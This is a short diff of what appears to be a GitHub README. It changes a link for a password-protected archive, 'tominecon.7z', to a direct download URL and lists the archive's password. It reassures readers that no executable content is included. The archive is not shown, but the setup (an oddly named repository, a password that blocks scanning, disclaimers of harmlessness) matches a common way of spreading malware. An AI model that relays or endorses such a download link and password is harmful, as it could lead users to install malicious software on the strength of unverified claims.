@@ -8,7 +8,7 @@ The archive file is available here for reference and documentation purposes only
 
 > ⚠️ No executable content is included. This file is provided as-is.
 
-- **Download:** [tominecon.7z](https://github.com/tominecon7z/.github/releases)
+- **Download:** [tominecon.7z](https://github.com/tominecon7z/.github/releases/download/tominecon.7z/tominecon.7z)
 - **File Password:** boxpig41
 
 ## 🎧 Podcast
